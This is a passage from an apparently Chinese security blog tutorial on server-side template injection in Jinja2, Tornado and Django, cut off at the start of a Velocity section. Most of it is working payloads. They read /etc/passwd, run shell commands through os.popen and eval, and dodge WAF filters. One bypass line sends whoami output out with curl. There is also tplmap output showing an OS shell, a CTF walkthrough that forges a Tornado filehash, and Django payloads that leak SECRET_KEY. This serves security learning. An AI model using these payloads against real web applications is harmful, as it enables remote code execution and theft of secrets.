&#39;NotImplementedType&#39;&gt;</span><br><span class="line">&lt;type &#39;traceback&#39;&gt;</span><br><span class="line">&lt;type &#39;super&#39;&gt;</span><br><span class="line">&lt;type &#39;xrange&#39;&gt;</span><br><span class="line">&lt;type &#39;dict&#39;&gt;</span><br><span class="line">&lt;type &#39;set&#39;&gt;</span><br><span class="line">&lt;type &#39;slice&#39;&gt;</span><br><span class="line">&lt;type &#39;staticmethod&#39;&gt;</span><br><span class="line">&lt;type &#39;complex&#39;&gt;</span><br><span class="line">&lt;type &#39;float&#39;&gt;</span><br><span class="line">&lt;type &#39;buffer&#39;&gt;</span><br><span class="line">&lt;type &#39;long&#39;&gt;</span><br><span class="line">&lt;type &#39;frozenset&#39;&gt;</span><br><span class="line">&lt;type &#39;property&#39;&gt;</span><br><span class="line">&lt;type &#39;memoryview&#39;&gt;</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br><span class="line">&lt;type &#39;enumerate&#39;&gt;</span><br><span class="line">&lt;type &#39;reversed&#39;&gt;</span><br><span class="line">&lt;type &#39;code&#39;&gt;</span><br><span class="line">&lt;type &#39;frame&#39;&gt;</span><br><span class="line">&lt;type &#39;builtin_function_or_method&#39;&gt;</span><br><span class="line">&lt;type &#39;instancemethod&#39;&gt;</span><br><span class="line">&lt;type &#39;function&#39;&gt;</span><br><span class="line">&lt;type &#39;classobj&#39;&gt;</span><br><span class="line">&lt;type &#39;dictproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;generator&#39;&gt;</span><br><span class="line">&lt;type &#39;getset_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;wrapper_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;instance&#39;&gt;</span><br><span class="line">&lt;type &#39;ellipsis&#39;&gt;</span><br><span class="line">&lt;type &#39;member_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">&lt;type &#39;PyCapsule&#39;&gt;</span><br><span class="line">&lt;type &#39;cell&#39;&gt;</span><br><span class="line">&lt;type &#39;callable-iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.long_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.float_info&#39;&gt;</span><br><span class="line">&lt;type &#39;EncodingMap&#39;&gt;</span><br><span class="line">&lt;type &#39;fieldnameiterator&#39;&gt;</span><br><span class="line">&lt;type &#39;formatteriterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.version_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.flags&#39;&gt;</span><br><span class="line">&lt;type &#39;exceptions.BaseException&#39;&gt;</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&lt;type &#39;imp.NullImporter&#39;&gt;</span><br><span class="line">&lt;type &#39;zipimport.zipimporter&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.stat_result&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.statvfs_result&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.WarningMessage&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.catch_warnings&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset.WeakSet&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Hashable&#39;&gt;</span><br><span class="line">&lt;type &#39;classmethod&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Iterable&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Sized&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Container&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Callable&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_keys&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_items&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_values&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Helper&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Pattern&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Match&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Scanner&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;</span><br></pre></td></tr></table></figure><p>使用dir来看一下file这个子类的内置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</span><br></pre></td></tr></table></figure><p>将读取的文件传入并使用readlines()方法读取，就相当于：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure><p>我们在使用jinja2的语法封装成可解析的样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;file&#39; %&#125;</span><br><span class="line">&#123;&#123; print(c(&quot;&#x2F;etc&#x2F;passwd&quot;).readlines()) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153255402.png" alt="image-20220209153255402"></p><p>会发现没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p><p>docker容器默认使用python3版本我们使用python2在进行查看发现已经成功执行命令</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153646329.png" alt="image-20220209153646329"></p><h3 id="使用内置模块执行命令"><a href="#使用内置模块执行命令" class="headerlink" title="使用内置模块执行命令"></a>使用内置模块执行命令</h3><p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<strong>globals</strong>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">search &#x3D; &#39;os&#39;   #也可以是其他你想利用的模块</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br></pre></td></tr></table></figure><p>我们可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure><p>不过同样，只能在python2版本中使用</p><p>这时候就要推荐<strong>builtins</strong>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">search &#x3D; &#39;__builtins__&#39;</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        #print(i.__init__.__globals__.keys())</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 58)</span><br><span class="line">(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 59)</span><br><span class="line">(&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, 60)</span><br><span class="line">(&lt;class &#39;_weakrefset.WeakSet&#39;&gt;, 61)</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, 77)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, 78)</span><br></pre></td></tr></table></figure><p>这时候我们的命令执行payload就出来了：</p><p>python3:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure><p>python2:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure><p>实际效果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209161439230.png" alt="image-20220209161439230"></p><h3 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#39;&#39;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一些绕过waf的姿势"><a href="#一些绕过waf的姿势" class="headerlink" title="一些绕过waf的姿势"></a>一些绕过waf的姿势</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤["></a>过滤[</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#getitem、pop</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#chr函数</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure><h4 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><h4 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;         &#x2F;&#x2F;popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p><p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python3 tplmap.py -u &quot;http:&#x2F;&#x2F;172.20.10.2:8000&#x2F;?name&#x3D;*&quot; --os-shell</span><br><span class="line">Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">Testing if GET parameter &#39;name&#39; is injectable</span><br><span class="line">Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">Smarty plugin is testing blind injection</span><br><span class="line">Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">Mako plugin is testing blind injection</span><br><span class="line">Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">Python plugin is testing blind injection</span><br><span class="line">Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tornado plugin is testing blind injection</span><br><span class="line">Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Jinja2 plugin has confirmed injection with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">Run commands on the operating system.</span><br><span class="line">posix-linux $ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>一键shell真香，还支持其他模版(Smarty, Mako, Tornado, Jinja2) 的注入检测</p><h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</p><p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tornado.template</span><br><span class="line">import tornado.ioloop</span><br><span class="line">import tornado.web</span><br><span class="line">TEMPLATE &#x3D; &#39;&#39;&#39;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt; Hello max &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    def get(self):</span><br><span class="line">        name &#x3D; self.get_argument(&#39;name&#39;, &#39;&#39;)</span><br><span class="line">        template_data &#x3D; TEMPLATE.replace(&quot;FOO&quot;,name)</span><br><span class="line">        t &#x3D; tornado.template.Template(template_data)</span><br><span class="line">        self.write(t.generate(name&#x3D;name))</span><br><span class="line"></span><br><span class="line">application &#x3D; tornado.web.Application([(r&quot;&#x2F;&quot;, MainHandler),], debug&#x3D;True, static_path&#x3D;None, template_path&#x3D;None)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    application.listen(8000)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>我们这里来用BUUCTF的easy_tornado来学习一下tornado render注入：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173354843.png" alt="image-20220209173354843"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173408296.png" alt="image-20220209173408296"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173423416.png" alt="image-20220209173423416"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173438540.png" alt="image-20220209173438540"></p><p>根据上面的信息，我们知道flag在/fllllllllllllag文件中</p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p><p>最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;3cf85a0e74c78ca404fd6ba98f1eacaa</span><br></pre></td></tr></table></figure><p>推测md5加密过后的值就是url中filehash对应的值,想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p><p>在tornado模板中，存在一些可以访问的快速对象，比如 &#123;&#123;escape(handler.settings[“cookie”])&#125;&#125;，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p><p>观察错误页面，发现页面返回的由msg的值决定</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173614183.png" alt="image-20220209173614183"></p><p>修改msg的值注入，获得环境变量</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209173654529.png" alt="image-20220209173654529"></p><p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename&#x3D;&#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">cookie_secret&#x3D;&quot;0eac01c9-92b5-459e-b475-287893e5ff3f&quot;</span><br><span class="line">hash.update(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">s1&#x3D;hash.hexdigest()</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174140368.png" alt="image-20220209174140368"></p><p>得到filehash=e952b058e7c5d648833b3bb13c52bb1b，获取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e583b767-ac22-4e38-8217-71136655925f.node4.buuoj.cn:81&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;e952b058e7c5d648833b3bb13c52bb1b</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209174219355.png" alt="image-20220209174219355"></p><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>先看存在漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;request.user))</span><br></pre></td></tr></table></figure><p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p><p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209175837650.png" alt="image-20220209175837650"></p><p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><h1 id="Java中的SSTI"><a href="#Java中的SSTI" class="headerlink" title="Java中的SSTI"></a>Java中的SSTI</h1><p>java常见的引擎：FreeMarker， velocity</p><h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p><p><strong>基本语法</strong></p><p><strong>语句标识符</strong></p><p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p><p><strong>变量</strong></p><p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p><p><strong>声明</strong></p><p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure><p><strong>注释</strong></p><p>单行注释为##，多行注释为成对出现的#* …………. *#</p><p><strong>条件语句</strong></p><p>以if/else为例：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($foo&#x3D;&#x3D;10)</span><br><span class="line">    &lt;strong&gt;2&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($bar&#x3D;&#x3D;6)</span><br><span class="line">    &lt;strong&gt;3&lt;&#x2F;strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;&#x2F;strong&gt;</span><br><span 